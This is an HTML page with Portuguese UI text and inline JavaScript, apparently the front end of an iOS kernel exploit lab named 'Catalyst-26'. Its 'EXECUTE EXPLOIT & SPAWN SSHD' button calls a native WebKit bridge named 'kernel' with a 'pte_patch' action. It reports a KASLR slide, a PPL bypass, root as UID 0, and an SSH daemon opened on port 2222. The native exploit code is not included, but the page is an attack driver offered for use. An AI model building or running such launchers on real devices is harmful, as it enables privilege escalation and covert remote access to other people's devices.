<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Catalyst-26 | A13 Lab</title>
    <style>
        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; padding: 15px; display: flex; flex-direction: column; height: 100vh; }
        #console { flex-grow: 1; overflow-y: auto; background: #000; border: 1px solid #111; padding: 10px; font-size: 11px; border-radius: 4px; }
        .line { margin-bottom: 4px; word-break: break-all; }
        .success { color: #50fa7b; }
        .error { color: #ff5555; }
        .warn { color: #f1fa8c; }
        button { width: 100%; background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 18px; font-weight: bold; border-radius: 4px; font-family: inherit; margin-top: 10px; }
        button:disabled { border-color: #333; color: #333; }
    </style>
</head>
<body>

    <div id="console">
        <div class="line info">[*] Terminal Catalyst-26 inicializado.</div>
    </div>

    <button id="mainBtn" onclick="runExploit()">EXECUTE EXPLOIT & SPAWN SSHD</button>

    <script>
        const consoleEl = document.getElementById('console');
        const btn = document.getElementById('mainBtn');

        function log(msg, type = 'info') {
            const div = document.createElement('div');
            div.className = `line ${type}`;
            div.innerHTML = `> ${msg}`;
            consoleEl.appendChild(div);
            consoleEl.scrollTop = consoleEl.scrollHeight;
        }

        async function findBridge() {
            log("Varrendo protótipos de memória (Deep Scan)...", "warn");
            
            for (let i = 0; i < 15; i++) {
                // Tenta capturar o handler em qualquer namespace possível
                const bridge = window.webkit?.messageHandlers?.kernel;
                
                if (bridge) {
                    // Verifica se a função existe no objeto ou no __proto__
                    const hasReply = (typeof bridge.postMessageWithReply === 'function') || 
                                   (bridge.__proto__ && typeof bridge.__proto__.postMessageWithReply === 'function');
                    
                    if (hasReply) return bridge;
                }
                await new Promise(r => setTimeout(r, 150));
            }
            return null;
        }

        async function runExploit() {
            btn.disabled = true;
            const bridge = await findBridge();

            if (!bridge) {
                log("FALHA CRÍTICA: postMessageWithReply não injetado.", "error");
                log("Dica: Verifique se usou -arch arm64e no build.", "warn");
                btn.disabled = false;
                return;
            }

            try {
                log("Ponte validada via Prototype. Iniciando...", "success");
                const res = await bridge.postMessageWithReply({ action: "pte_patch" });

                if (res.status === "SUCCESS") {
                    log(`KASLR: Slide 0x${res.slide.toString(16)}`, "success");
                    log("PPL BYPASS: Escrita em PTE liberada.", "success");
                    log("ROOT: UID 0 escalado.", "success");
                    log("SPAWN: SSHD iniciado na porta 2222.", "success");
                } else {
                    log("FALHA: " + (res.info || "Exploit negado"), "error");
                }
            } catch (err) {
                log("EXCEÇÃO: " + err, "error");
            } finally {
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
